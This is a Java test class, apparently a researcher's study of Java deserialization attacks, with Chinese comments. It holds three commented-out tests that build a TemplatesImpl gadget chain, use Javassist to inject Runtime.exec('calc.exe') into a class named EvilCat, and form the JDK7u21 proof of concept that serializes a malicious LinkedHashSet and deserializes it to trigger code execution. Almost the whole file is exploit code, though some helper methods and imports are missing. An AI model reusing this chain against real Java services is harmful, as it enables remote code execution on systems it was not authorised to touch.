package com.example.demo.model;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import javassist.*;
import org.junit.Test;
import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class testTemplatesImpl {

//    @Test
//    public void testTemplatesImpl() throws Exception {
//        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
//        CtClass cc = pool.get(Target.class.getName());
//        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
//        // 创建 static 代码块，并插入恶意代码
//        cc.makeClassInitializer().insertBefore(cmd);
//        // 使用构造方法也可以
//        //CtConstructor constructor = cc.getDeclaredConstructor(new CtClass[]{});
//        //constructor.insertBefore(cmd);
//        String randomClassName = "EvilCat" + System.nanoTime();
//        cc.setName(randomClassName);
//        // 为了使 _transletIndex 正确，并执行 newInstance()，具体可查看 defineTransletClasses 方法
//        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
//        // 获取字节码
//        byte[] evilByteCodes = cc.toBytecode();
//        byte[][] targetByteCodes = new byte[][]{evilByteCodes};
//        TemplatesImpl templates = TemplatesImpl.class.newInstance();
//        setFieldValue(templates, "_bytecodes", targetByteCodes);
//        // 进入 defineTransletClasses() 方法需要的条件
//        setFieldValue(templates, "_name", "name" + System.nanoTime());
//        setFieldValue(templates, "_class", null);
//        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
//        templates.newTransformer();
//    }

//    @Test
//    public void testTemplateImpl() throws Exception {
//        Map map = new HashMap();
//        //  AnnotationInvocationHandler 构造方法为 package private，需要使用反射创建实例
//        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
//        ctor.setAccessible(true);
//        // 构造 payload 时，因为新版 jdk 对 type 参数做了校验，必须为 Annotation
//        // 为了不报错，所以设置为任意一个 Annotation，再用反射修改 type 参数
//        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, map);
//        // 反射设置属性值
//        setFieldValue(invocationHandler, "type", Templates.class);
//        // 代理 Tempaltes 接口
//        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, invocationHandler);
//        // 获取包含恶意代码的 Templates 对象
//        Templates evilTemplates = getEvilTemplates();
//        // 触发恶意代码执行
//        proxy.equals(evilTemplates);
//    }


//    @Test
//    public void testPoc() throws Exception {
//        Map map = new HashMap();
//        String magicStr = "f5a5a608";
//        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
//        ctor.setAccessible(true);
//        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, map);
//        setFieldValue(invocationHandler, "type", Templates.class);
//        // value 先放入任意值，让 HashSet.add(proxy) 成功
//        map.put(magicStr, "foo");
//        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, invocationHandler);
//        Templates evilTemplates = getEvilTemplates();
//        HashSet target = new LinkedHashSet();
//        target.add(evilTemplates);
//        target.add(proxy);
//        // 放入实际的 value
//        map.put(magicStr, evilTemplates);
//
//        String filename = "/tmp/jdk7u21";
//        // 序列化
//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
//        oos.writeObject(target);
//        // 反序列化, boom
//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
//        ois.readObject();
//    }

}
